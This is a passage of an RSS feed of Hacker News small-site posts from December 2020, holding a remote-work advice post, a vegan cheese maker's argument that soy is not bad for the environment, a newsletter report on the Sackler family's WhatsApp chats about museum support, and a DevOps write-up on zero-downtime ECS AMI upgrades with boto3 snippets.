I am not a big fan of forcing the team to have a good time together. Listen to them and ask them what they would like to do. Maybe your team would like a little hackathon afternoon or a game night or just having a drink while chatting in the open window?</p><h2 id="reduce-interruptions">Reduce Interruptions</h2><p>If you are using Slack as a primary means of communication, agree on when itâ€™s ok to <code>@</code> mention someone. For example, in my team we have the following three categories of questions:</p><ol><li>Non-urgent: Are prefixed with a â“</li><li>Questions that need answers in a few minutes have a ğŸš¨ prefix</li><li>For truly important questions, we tag the â€œon-dutyâ€ engineer in your question</li></ol><p>Since we are operating the platform behind <a href="https://www.ricardo.ch/">Ricardo</a> interruptions can happen anytime. To reduce the impact on the team, we have a weekly rotation of an â€œSRE on Dutyâ€. The SoD is responsible to answer questions from the developers, on-call engineers, or is the first to jump into incidents. They also tackle any unplanned work that needs to be taken care of.</p><p>This setup allows the rest of the team to disable most notifications and work uninterrupted.</p><h2 id="personal-well-being">Personal Well-Being</h2><p>Everybody is different and has different needs. Following are a few recommendations that have worked for me in the past and might be helpful for others. In the end, you have to figure out what works and what is important for your well-being.</p><ul><li>Donâ€™t forget to treat yourself. Go for a walk over lunch, eat fruits, do something to relax. Not going to the office also means you will miss out on all the walking you usually do to get to the office and inside the office.</li><li>Make your home office comfortable and ergonomic. Get an adjustable desk and chair. Invest in a good 4k screen (e.g. HP Z27 or Dell U2720Q), a good keyboard and a mouse (e.g. Logitech MX Master 3).</li><li>There are no hero awards for working overtime. Of course, sometimes there is the need for a short sprint, but we are in it for the long haul.</li><li>Track your time for yourself. Youâ€™ll be surprised how much you work.</li><li>If you have trouble winding down at the end of the day, one thing that can help is to ask yourself â€œHave I done a good dayâ€™s work?â€ Answering that question is liberating. Often, if the answer is an easy â€œyesâ€, you can stop working feeling satisfied that something important got accomplished. Should the answer be â€œnoâ€, you can treat it as an off-day and explore the <a href="https://en.wikipedia.org/wiki/Five_whys">Five Whys</a>.</li><li>Creating a routine can help to get into a working mood and out of working wood. Eg. walk around the block before and after work.</li><li>Itâ€™s recommended that you have separate devices for work and pleasure. For example, if you want to watch something in the evening on Netflix, it is very tempting to â€œjust check an emailâ€ and get sucked back into work.</li></ul><h2 id="resources">Resources</h2><p>The following blog posts and books inspired the content of this blog post:</p><ul><li><a href="https://www.hanselman.com/blog/LoveInATimeOfCoronaVirusTipsTricksAndBestPracticesForWorkingRemotely.aspx">Love in a time of Corona Virus - Tips, Tricks and Best Practices for Working Remotely</a></li><li><a href="https://about.gitlab.com/company/culture/all-remote/guide/">GitLabâ€™s Guide to All-Remote</a></li><li>Remote: Office Not Required <a href="https://www.amazon.de/gp/product/B00CZ7OC46/ref=ppx_yo_dt_b_d_asin_title_o00?ie=UTF8&amp;psc=1">[Amazon]</a></li><li>Rework: It doesnâ€™t have to be crazy at work <a href="https://www.amazon.com/Doesnt-Have-Be-Crazy-Work/dp/0062874780">[Amazon]</a></li><li><a href="https://dev.to/nebojsac/slack-keeps-interrupting-you-but-you-can-stop-it-883">Slack keeps interrupting you, but you can stop it</a></li></ul></section></div>]]>
            </description>
            <link>https://bueti-online.ch/blog/remote-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25499327</guid>
            <pubDate>Mon, 21 Dec 2020 20:43:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No, soy is not bad for the environment]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25499257">thread link</a>) | @shafyy
<br/>
December 21, 2020 | https://blog.yeticheese.com/no-soy-is-not-bad-for-the-environment/ | <a href="https://web.archive.org/web/*/https://blog.yeticheese.com/no-soy-is-not-bad-for-the-environment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>Soy is the main ingredient in our cheese. Surprisingly often, we get asked some version of this question: "Isn't soy bad for the environment?"</p><p>The short answer is: No, quite the contrary.</p><p>The rest of this post is devoted to the long answer.</p><p>Since we started working on <a href="https://yeticheese.com/">Yeti Cheese</a>, we realized that there's a lot of misinformation around soybean. Over and over, we read and hear stuff about soy that is just plain wrong from people that otherwise seem smart. I wonder who might be behind this? <em>*cough* meat and dairy lobbies *cough*</em></p><p>A lot of this misinformation is around environmental concerns. This belief originates from the fact that soy is a major driver of deforestation, especially in the Amazon and neighboring regions in South America. Which is true. But that's not the end of the story. What is often left out is that the vast majority of soy is grown to be used as animal feed. There are different estimates to what this number exactly is, but most are upwards of 90%.</p><figure><img src="https://blog.yeticheese.com/content/images/2020/12/EoDe4BMWMAAMl_c.jpg" alt="" width="993" height="1121" srcset="https://blog.yeticheese.com/content/images/size/w600/2020/12/EoDe4BMWMAAMl_c.jpg 600w, https://blog.yeticheese.com/content/images/2020/12/EoDe4BMWMAAMl_c.jpg 993w" sizes="(min-width: 720px) 720px"><figcaption>Break-down of soybean usage based on USDA data.</figcaption></figure><p>As the above diagram shows, the USDA reports that only 6% of soy are used as food for humans (e.g. as tofu or Yeti Cheese ğŸ˜). The rest is used either directly as animal feed, or processed to soy cake (also called soy meal) and then given to cows, pigs and chickens.</p><h3 id="but-what-about-soy-oil">But what about soy oil?</h3><p>The astute reader will now raise a remark about soy oil. After all, 19% of the processed soybean is made into oil which is consumed mostly by humans. Soy oil is one of the most used oils globally, but only because it is cheaply available as a by-product of soy cake production. Soy cake has great nutritional values and almost no fat (which has been separated into the soy oil) and is therefore sought after as livestock feed. Hence, soy cake is the main driver of soy demand, and not soy oil. There's nothing unique about soy oil, and it can easily be substituted with other plant-based oils.</p><figure><img src="https://blog.yeticheese.com/content/images/2020/12/soy-meal-vs-soy-oil.jpg" alt="" width="853" height="636" srcset="https://blog.yeticheese.com/content/images/size/w600/2020/12/soy-meal-vs-soy-oil.jpg 600w, https://blog.yeticheese.com/content/images/2020/12/soy-meal-vs-soy-oil.jpg 853w" sizes="(min-width: 720px) 720px"><figcaption>Soy oil vs soy meal. Pretty clear why soy oil is separated from soy before feeding it to animals. Source: <a href="https://www.nutritionvalue.org/">nutritionalvalue.org</a></figcaption></figure><h3 id="soy-is-one-of-the-best-food-sources">Soy is one of the best food sources</h3><p>In summary, people think that soy is bad for the environment because it is grown in insane quantities for the livestock agriculture industry. It's clear that shifting the population to a plant-based diet will reduce the demand for soy dramatically. This shift will also make free a lot of land where wild vegetation and biodiversity can be restored, capturing loads of carbon in the process.</p><p>So no, soy is not bad for the environment. Quite the contrary: It's one of the best food sources we have available on this little blue planet of ours.</p><h3 id="further-reading">Further reading</h3><p><a href="https://www.fertstert.org/article/S0015-0282(09)00966-2/fulltext">Clinical studies show no effects of soy protein or isoflavones on reproductive hormones in men: results of a meta-analysis</a></p><p><a href="https://globalforestatlas.yale.edu/amazon/land-use/soy">Soy Agriculture in the Amazon Basin</a></p>
			</section></div>]]>
            </description>
            <link>https://blog.yeticheese.com/no-soy-is-not-bad-for-the-environment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25499257</guid>
            <pubDate>Mon, 21 Dec 2020 20:35:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Sacklersâ€™ group chat of pain]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25499198">thread link</a>) | @benrapscallion
<br/>
December 21, 2020 | https://the.ink/p/sacklers | <a href="https://web.archive.org/web/*/https://the.ink/p/sacklers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Welcome to The.Ink, my newsletter about money and power, politics and culture. If youâ€™re joining us for the first time, hello! Click the orange button below to get this in your inbox, free. Please consider becoming a paid subscriber to support this work.</em></p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F33eaf6dc-2dbc-400c-919c-d497823cef13_2346x728.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F33eaf6dc-2dbc-400c-919c-d497823cef13_2346x728.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/33eaf6dc-2dbc-400c-919c-d497823cef13_2346x728.png&quot;,&quot;height&quot;:452,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:122105,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>For years, as an opioid crisis ravaged America, the Sackler family, which founded Purdue Pharma, the company that made OxyContin, remained largely out of the public eye, free <a href="https://www.forbes.com/sites/angelauyeung/2020/12/17/despite-years-of-litigation-the-sackler-family-behind-oxycontin-is-still-worth-billions/?sh=26a512645047">to accumulate billions of dollars of wealth in tranquility</a>. But in recent years, the walls began to close in, as the press and regulators and lawyers and state attorneys general began to investigate Purdueâ€™s role in the epidemic. And as pressure rose, to whom did the Sacklers turn to vouch for them?</p><p>The museums that had taken their philanthropy.</p><p>The Ink has seen a tranche of the Sacklersâ€™ WhatsApp group chats as members of the family sought to cope with and strategize about their fall from grace and growing legal risk. They were quietly released as part of an ongoing bankruptcy proceeding, thanks to <a href="https://restructuring.primeclerk.com/purduepharma/Home-DownloadPDF?id1=MTEzMTYxMQ==&amp;id2=0">demands by multiple news organizations</a>. A source provided them to The Ink, which is the first publication to report on them. (To assist better-resourced follow-up reporting, The Ink will now offer to collaborate with larger news organizations.)</p><p>The messages show how, in the plutocratic echelons, it is assumed that philanthropic gifts made in sunny times can buy you public support from prestigious institutions on a rainy day. They show how a family that could no longer deny the scale of pain and death in the country tended to view the problem primarily through the prism of public relations, their anger concentrated on the difficulty of crafting statements, not curbing the hurt. And the messages show how a profound sense of victimhood descended on some members of the family, perhaps blinding them to the need to address the problem in the way one relative suggested: at a cost to their bottom line.</p><p>â€œWe are the most vulnerable of the opponents (as we are a private family owned business) and in their view the easiest prey to get lots of money from!,â€ <a href="https://www.theguardian.com/us-news/2018/feb/13/meet-the-sacklers-the-family-feuding-over-blame-for-the-opioid-crisis">Mortimer Sackler</a>, son of a deceased family patriarch by the same name, texted the group in 2018, fretting about legal cases.</p><p>Two years later, the walls have closed in further. The Sacklers and Purdue are enmeshed in <a href="https://www.washingtonpost.com/national-security/2020/10/21/purdue-pharma-charges/">complex settlement negotiations</a> in cases from across the country, although they continue, <a href="https://www.nytimes.com/2020/12/17/health/opoids-sacklers-purdue-testimony.html">as The New York Times reported this week</a>, to refuse â€œto be held personally or criminally responsible and to turn over substantial portions of their fortune.â€ On Thursday, they faced scathing criticism from lawmakers on Capitol Hill.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F2935287f-fbc5-4388-b927-518adea55695_600x600.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F2935287f-fbc5-4388-b927-518adea55695_600x600.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/2935287f-fbc5-4388-b927-518adea55695_600x600.jpeg&quot;,&quot;height&quot;:600,&quot;width&quot;:600,&quot;resizeWidth&quot;:48,&quot;bytes&quot;:71098,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>In one way, the WhatsApps revealed the Sackler family to be like you and me. They had the usual group-chat issues. When <a href="https://www.theguardian.com/us-news/2018/feb/13/meet-the-sacklers-the-family-feuding-over-blame-for-the-opioid-crisis">Mortimer</a> apparently wanted relatives to keep their discussions â€œoff emailâ€ and on WhatsApp, it was tricky to get everyone on board.</p><p>â€œI canâ€™t, because Marissa is the admin of the group,â€ <a href="https://www.theguardian.com/us-news/2018/feb/13/meet-the-sacklers-the-family-feuding-over-blame-for-the-opioid-crisis">Michael Sackler</a>, a film producer and founder of Rooks Nest Ventures, texted. (The messages at times only list sendersâ€™ first names, so The Ink has tried to match messages to names of family members.)</p><p>Someone else complained that their mother didnâ€™t have WhatsApp. Marissa Sackler replied, â€œIf she can Instagram Iâ€™m pretty sure she can master whatâ€™s app.â€ <a href="https://www.crunchbase.com/person/marissa-sackler">Marissa is described on Crunchbase</a> as â€œcontinuing the family tradition of philanthropy,â€ having started an incubator that assists â€œemerging nonprofits.â€</p><p>At times, their family struggles were mundane and logistical: â€œHi I would love to make a dinner happen Saturday. Want to do a casual dinner with my kiddos? Or were you thinking fancy adult thing?â€ wrote Jeffrey Lefcourt, a <a href="https://www.nytimes.com/2006/08/06/fashion/weddings/06hitchcock.html">family member</a> and <a href="https://ctrnyc.com/about/">proprietor</a> of the popular New York City restaurant brand The Smith.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F2935287f-fbc5-4388-b927-518adea55695_600x600.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F2935287f-fbc5-4388-b927-518adea55695_600x600.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/2935287f-fbc5-4388-b927-518adea55695_600x600.jpeg&quot;,&quot;height&quot;:600,&quot;width&quot;:600,&quot;resizeWidth&quot;:48,&quot;bytes&quot;:71098,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>But as pressure against the Sacklers ratcheted up, the texts turned serious. And the reflex for managing it came naturally: letâ€™s hit up those to whom weâ€™ve given back.</p><p>For example, in November 2016, the Dia Art Foundation in New York had announced, according to <a href="https://www.artnews.com/art-news/news/dia-art-foundation-creates-sackler-institute-focused-on-programming-research-and-education-with-generous-gift-7226/">a report in ARTnews</a>, that â€œfollowing a gift from the Dr. Mortimer and Theresa Sackler Foundation, it has created the Sackler Institute, which a release describes as â€˜a center without walls.â€™â€ In years past, the Sacklers had given similar gifts to the <a href="https://www.theguardian.com/artanddesign/2019/mar/21/tate-art-galleries-will-no-longer-accept-donations-from-the-sackler-family">Tate</a> group of British galleries, the <a href="https://www.theguardian.com/artanddesign/2019/jul/10/v-and-a-boss-tristram-hunt-sacklers-family-funding">Victoria and Albert Museum</a> in London, and <a href="https://www.newyorker.com/news/our-columnists/nan-goldin-leads-a-protest-at-the-guggenheim-against-the-sackler-family">the Guggenheim</a> and <a href="http://www.sackler.org/sackler-wing-the-metropolitan-museum-of-art-new-york-ny/">the Metropolitan Museum of Art</a> and <a href="https://www.amnh.org/exhibitions/permanent/human-origins/sackler-educational-laboratory">the American Museum of Natural History</a> in New York.</p><p>Well, to quote the title of <a href="https://www.versobooks.com/books/2344-no-such-thing-as-a-free-gift">a book by Linsey McGoey</a>, there is â€œno such thing as a free gift.â€</p><p>In late October 2017, Marissa Sackler texted the family: â€œI just spoke to head of communications at dia. They and many other art institutions plus bio medical schools have been reached out to by the New York Times. / Dia shares pr representation with the tate and a number of other art institutes whoâ€™ve been contacted. They are all planning to give short positive statements about us being supporters of theirs. / They expect the article to come out in the next week.â€</p><p>She was wrong only about timing. On December 1, 2017, <a href="https://www.nytimes.com/2017/12/01/arts/design/sackler-museum-donations-oxycontin-purdue-pharma.html">a report in The New York Times</a> showed how there is no silencer as effective as money. â€œThe New York Times surveyed 21 cultural organizations listed on tax forms as having received significant sums from foundations run by two Sackler brothers who led Purdue,â€ <a href="https://twitter.com/ColinRMoynihan">Colin Moynihan</a> wrote, adding: â€œNone indicated that they would return donations or refuse them in the future.â€</p><p>Another message â€” sent to the group chat by <a href="https://www.tatler.com/article/sackler-scandal">Samantha Sackler Hunt</a> â€” suggested that emails sent by reporters to cultural institutions, asking about Sackler gifts, were being relayed back to the family, apparently via the public-relations firm Edelman:</p><blockquote><p>From Edelman</p><p>Hi all</p><p>I just wanted to keep you in the loop that a reporter from The Times (London) has also been emailing various cultural institutions that have benefitted from Sackler Family philanthropy. It seems as though she is doing a very similar exercise to the reporter from the New York Times that you have already been made aware of. Below is the request that got sent through to the V&amp;A. She appears to be sending versions of this to a number of others. From what Iâ€™ve seen so far most are responding with the same types of generic statements they gave the New York Times and all appear supportive. Georgie Keate, the reporter in question, is a general home news reporter and joined The Times in 2014 as a graduate trainee so is still relatively junior. This could indicate that it may not be a large story for them or she may be doing the spade work for someone else. We will make Josie aware.</p><p>[The reporter <a href="https://twitter.com/georgiekeate">Georgie Keate</a>â€™s email supposedly begins here]</p><blockquote><p><em>I am doing a story on the Sackler family and their family fortune - which derives from the extremely controversial drug Oxycontin which their company Purdue Pharma is accused of marketing falsely by claiming it was safe and non-addictive. They have faced thousands of lawsuits and paid out tens of millions over the last decade over their aggressive marketing campaigns and refusal to take responsibility for the fact the drug is dangerous. Having been held to account in America, the family continue to push it in developing countries.</em></p><p><em>Obviously, the family has donated to scores of theatres, museums and colleges across the UK while keeping their connection to Purdue and Oxycontin completely secret.</em></p><p><em>Many people who are becoming aware of this are astonished and question whether the art world should be so heavily funded by a family who have been involved in such serious wrongdoing. Some have compared it to the 100s of notables who petitioned to have BP removed from the Tate. The V&amp;A is obviously one of these beneficiaries - would you be able to comment for an article?</em></p></blockquote></blockquote><p>Some months later, in March 2018, the family could continue to feel that museums were on their team. Mortimer WhatsApped the family: â€œJackie spoke with the Met this morning and they are going to stand by us.â€</p><p>Referring to the protests led by the artist Nan Goldin that were moving public opinion against the Sacklers, Mortimer wrote: â€œBetter that the company use her protests as an opportunity to speak to the industry leading work they have been doing to combat prescription drug abuse. What we SHOULD do is make sure that the Guggenheim, AMNH, DIA, etc are not going to say something unhelpful. We should compile a list of organizations and decide who should speak with which.â€</p><p><a href="https://www.theguardian.com/us-news/2018/feb/13/meet-the-sacklers-the-family-feuding-over-blame-for-the-opioid-crisis">Marissa Sackler</a> volunteered: â€œI speak regularly with dia on all of this and they fully support us and think Nan Goldin is crazy.â€</p><p><a href="https://www.theguardian.com/us-news/2018/feb/13/meet-the-sacklers-the-family-feuding-over-blame-for-the-opioid-crisis">Ilene Sackler Lefcourt</a> chimed in: â€œI am reaching out to the AMNH through the chairman of the boardâ€™s best friend.â€</p><p>Nevertheless, the following year, a growing number of institutions began to <a href="https://www.nytimes.com/2019/05/15/arts/design/met-museum-sackler-opioids.html">change their minds</a>, declaring that they would no longer take Sackler money and, in some cases, removing the Sackler name from their facilities. The institutions included the Met, the Guggenheim, the Tate Modern, the American Museum of Natural History, New York University, and Tufts.</p><p>When one of the announcements came, the first words about it in the group chat, from <a href="https://www.theguardian.com/us-news/2018/feb/13/meet-the-sacklers-the-family-feuding-over-blame-for-the-opioid-crisis">Sophie Sackler</a>, were: â€œDid anyone know this was happening?â€</p><p>And alarm grew as even that most mercenary of sectors â€” banking â€” seemed to turn its back on Purdue. â€œDoes anyone know why <a href="https://www.reuters.com/article/us-purdue-pharma-jp-morgan-exclusive/exclusive-jpmorgan-cuts-ties-with-oxycontin-maker-purdue-pharma-sources-idUSKCN1ST2EA">JPM is not doing Purdue banking</a>?â€ Jeffrey Lefcourt texted the family on May 24, 2019, just days after <a href="https://www.nytimes.com/2019/05/15/arts/design/met-museum-sackler-opioids.html">a wave of museum disavowals</a>, apparently referring to the banking giant J.P. Morgan Chase. â€œWhatâ€™s their reason? Any concern they will stop doing banking for family? Have any of you spoken to them?â€</p><p>Mortimer responded: â€œThey told Purdue it was for â€˜reputationâ€™ reasons but that they were (so far) limiting it only to Purdue and not to the family.â€</p><p>The timing suggests, though hardly proves, that the museumsâ€™ abrupt reversal on support for the family coincided with problems closer to the core of their business operations. Which raises the question of whether the arts institutionsâ€™ years of silence helped a machinery of death â€¦</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://the.ink/p/sacklers">https://the.ink/p/sacklers</a></em></p>]]>
            </description>
            <link>https://the.ink/p/sacklers</link>
            <guid isPermaLink="false">hacker-news-small-sites-25499198</guid>
            <pubDate>Mon, 21 Dec 2020 20:30:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Zero-Downtime ECS Cluster Upgrades]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25499038">thread link</a>) | @christinebeta
<br/>
December 21, 2020 | https://eatcodeplay.com/zero-downtime-ecs-cluster-upgrades-da70f3a8a3fd | <a href="https://web.archive.org/web/*/https://eatcodeplay.com/zero-downtime-ecs-cluster-upgrades-da70f3a8a3fd">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><p id="fd6c">As part of the DataOps team at RealScout, I recently worked on a project to tackle infrastructure issues that plagued us for some time. We struggled with ongoing maintenance in keeping our Amazon ECS clusters up to date on the latest AMIs. Our instances, in particular, use the ECS-optimized AMIs. These AMIs include ECS container agents that are responsible for keeping instances registered and managing tasks within the cluster.</p><p id="3ab4">New AMIs are regularly released and include updated ECS container agents along with any other OS or security updates. However, the steps to upgrade instances to the latest AMI while avoiding disruptions to running tasks were extremely manual and tedious. The lack of automation hindered timely AMI updates to our EC2 instances. We observed that the more out of date agents became, the more likely they were to get disconnected. Instances would enter a zombie-like state, no longer picking up tasks.</p><p id="efc0">This resulted in major disruptions to our infrastructure that impacted our entire data ingestion pipeline. This article describes our solution to automate the AMI upgrades to our cluster without any downtime. Challenges that we encountered along the way are also addressed here.</p><p id="4416"><strong>Our Infrastructure</strong></p><p id="345f">At a high-level, our infrastructure consists of EC2 instances in an ECS cluster. The EC2 instances are part of an Auto Scaling group to maintain our required capacity. We use CloudFormation to manage and provision our AWS resources consistently across our stacks.</p><p id="8d05"><strong>Our Old Process</strong></p><p id="2672">Our old process involved a series of steps performed within the AWS console. We first created a CloudFormation change set with the new AMI and executed it. This would update the template for our stack.</p><p id="c32a">Before applying the new AMI updates to the instances themselves, we needed to ensure running tasks did not get disrupted. To do so, each ECS instance is set to a state of â€œDRAINING.â€ This prevents the instance from picking up new tasks while allowing running tasks to complete. Once the instances are completely drained, we terminate the instances. We then let the Auto Scaling Group bring up new, updated instances with the latest AMI version defined in the CloudFormation template.</p><p id="3587"><strong>Our Goal</strong></p><p id="107a">We wanted to automate, as much as possible, the task of upgrading the AMI on our cluster instances with no downtime. The system needed to replicate our manual steps to terminate and bring up new instances. All running tasks should run to completion without interruption.</p><p id="47a9">We also wanted to incorporate metrics and monitoring of the ECS cluster. We know that the latest AMI versions would also include the latest agent as well. In the past, we occasionally encountered agents getting disconnected and remaining disconnected, preventing task placements on instances. We wanted peace of mind that should this scenario creep up, it would be resolved in a timely manner.</p><p id="2b37"><strong>Our Implementation</strong></p><p id="4821">We wrote a Lambda, using the boto3 SDK with the appropriate APIs for each AWS resource. Aside from the Lambda, several other AWS resources were used:</p><ul><li id="5997">SNS â€” the Lambda subscribes to two SNS topics: one is an AWS defined topic where AMI updates are published. The other is an SNS topic we set up to publish our own series of events.</li><li id="abfe">CloudFormation â€” used to define all resources within our stack. It also defines IAM roles and permissions for each resource.</li><li id="a688">CloudWatch Event â€” essentially, a scheduler used to trigger our Lambda every 15 minutes, where we then perform some basic health monitoring. This includes checking whether an instance is running the latest AMI and initiates a termination if not.</li><li id="1bb7">CloudWatch Alarm â€” we set up an alarm to monitor CPU usage across our instances. It publishes to our SNS topic anytime CPU usage drops below 10%. We use this to determine when our instance is idle and therefore, no longer running any tasks.</li><li id="fe86">Auto Scaling Group â€” our EC2 instances are part of an auto scaling group. The auto scaling group is responsible for maintaining our required capacity. It automatically provisions new instances as needed to meet capacity.</li><li id="0448">LifeCycle Hooks â€” as its name implies, these allow us to hook into the lifecycle of an EC2 instance. It lets us pause a termination event and run some custom actions before resume termination.</li></ul><p id="fbef">High-level descriptions along with some code snippets are provided below to describe the three main functions of the Lambda.</p><p id="d81f">1) When a new AMI is available, we update our CloudFormation template to include the new version. We subscribe to the <a href="https://docs.aws.amazon.com/AmazonECS/latest/developerguide/ECS-AMI-SubscribeTopic.html" rel="noopener">Amazon ECS-optimized AMI</a> topic to receive update notifications. Once our Lambda receives an event that a new AMI is published, it creates and executes a change set for our CloudFormation template. We notify our team of the new AMI and when the change set gets executed via DataDog and Slack integrations. At this point, the only actual change is only to our CloudFormation template. We do not apply the change to the instances yet.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3108/1*F0wPMc_1Ijtb5FMU05A0bw.png" width="1554" height="422" srcset="https://miro.medium.com/max/552/1*F0wPMc_1Ijtb5FMU05A0bw.png 276w, https://miro.medium.com/max/1104/1*F0wPMc_1Ijtb5FMU05A0bw.png 552w, https://miro.medium.com/max/1280/1*F0wPMc_1Ijtb5FMU05A0bw.png 640w, https://miro.medium.com/max/1400/1*F0wPMc_1Ijtb5FMU05A0bw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*F0wPMc_1Ijtb5FMU05A0bw.png?q=20"></p></div></div></div><figcaption>Updating CloudFormation template with new AMI</figcaption></figure><p id="1b15">2) Our next step performs a couple of health checks. We configure a CloudWatch event that runs every 15 minutes to check for any EC2 instances with disconnected agents. Since it is possible for agents to periodically get disconnected for various reasons and reconnect on their own, we implemented a check to detect agents disconnected for longer than 30 minutes. Instances disconnected for longer than our grace period are terminated. The auto scaling group then brings up a new, healthy instance. This does rely on some higher-level architecture to reschedule any ECS tasks that are killed as a result of this, so consider that for your own setup.</p><p id="ccfd">The second health check verifies if all instances are running on the latest AMI as specified in our CloudFormation template. Since we immediately update our template when a new AMI is published, our scheduled health check detects any instances not on the AMI within a 15 minute interval at most. To kick off this chain of events, we simply terminate the out-of-date instances, and again, rely on the auto scaling group to bring up new instances containing the latest AMI.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1682/1*VbksgDN871WDKXTWIAl0_g.png" width="841" height="240" srcset="https://miro.medium.com/max/552/1*VbksgDN871WDKXTWIAl0_g.png 276w, https://miro.medium.com/max/1104/1*VbksgDN871WDKXTWIAl0_g.png 552w, https://miro.medium.com/max/1280/1*VbksgDN871WDKXTWIAl0_g.png 640w, https://miro.medium.com/max/1400/1*VbksgDN871WDKXTWIAl0_g.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*VbksgDN871WDKXTWIAl0_g.png?q=20"></p></div></div></div><figcaption>Check for outdated instance AMIs and agent health</figcaption></figure><p id="3088">3) The final step is where the bulk of the work is in our Lambda. The importance here, however, is that we ensure instances are gracefully terminated. A lifecycle hook plays a major part in doing so. We set up a life cycle hook that subscribes to an SNS event when an instance is terminating. The hook allows us to pause the termination and perform a series of actions before completing the instance terminations.</p><p id="31bb">Once a termination is detected, we set the status of each instance to DRAINING. We then re-publish an event to request termination again for the instance. This new termination request event will trigger our Lambda again. This time, we check for any running tasks on instances marked as DRAINING.</p><p id="3220">For any instances that are still draining, we set a CloudWatch alarm to check when the instance becomes idle, indicating it is no longer running any tasks. This is slightly different than similar implementations where an event is re-published (i.e, continues to loop) to check for running tasks. This introduces an additional AWS resource to the layer. Since we occasionally have some very long running tasks (e.g, 12 hours), we decided to go with using an alarm to detect CPU usage to determine when the instance was likely drained. If the CPU usage on an instance drops to less than 10%, the CloudWatch alarm triggers an event, where we then check again if all tasks are complete. This approach cut out wasteful, continuous looping for very long running tasks.</p><pre><span id="869f">cloudwatch.put_metric_alarm(<br> AlarmName=f"Check_Idle_{instance['ec2InstanceId']}",<br> AlarmDescription='Instance pending termination appears idle (&lt;= 10%)',<br> AlarmActions=[topic_arn],<br> MetricName='CPUUtilization',<br> Namespace='AWS/EC2',<br> Statistic='Average',<br> Dimensions=[{'Name': 'InstanceId', 'Value': instance['ec2InstanceId']}],<br> Period=60, # seconds<br> EvaluationPeriods=1,<br> Threshold=10,<br> ComparisonOperator='LessThanOrEqualToThreshold',<br> TreatMissingData='breaching'<br>)</span></pre><p id="0bfe">Once instances no longer have running tasks, we allow the termination to complete:</p><pre><span id="ba48">asg.complete_lifecycle_action(<br> LifecycleHookName=msg['LifecycleHookName'],<br> AutoScalingGroupName=msg['AutoScalingGroupName'],<br> LifecycleActionResult='CONTINUE',<br> InstanceId=instance['ec2InstanceId'])</span></pre><p id="dc64">Our implementation was influenced by AWSâ€™s <a href="https://aws.amazon.com/blogs/compute/automatically-update-instances-in-an-amazon-ecs-cluster-using-the-ami-id-parameter" rel="noopener">example</a> implementation. The main tweak we made was using CloudWatch alarms to notify when an instance has completed all running tasks.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3680/1*aLUt_mnySqq087XIXLipLg.png" width="1840" height="762" srcset="https://miro.medium.com/max/552/1*aLUt_mnySqq087XIXLipLg.png 276w, https://miro.medium.com/max/1104/1*aLUt_mnySqq087XIXLipLg.png 552w, https://miro.medium.com/max/1280/1*aLUt_mnySqq087XIXLipLg.png 640w, https://miro.medium.com/max/1400/1*aLUt_mnySqq087XIXLipLg.png 700w" sizes="700px" 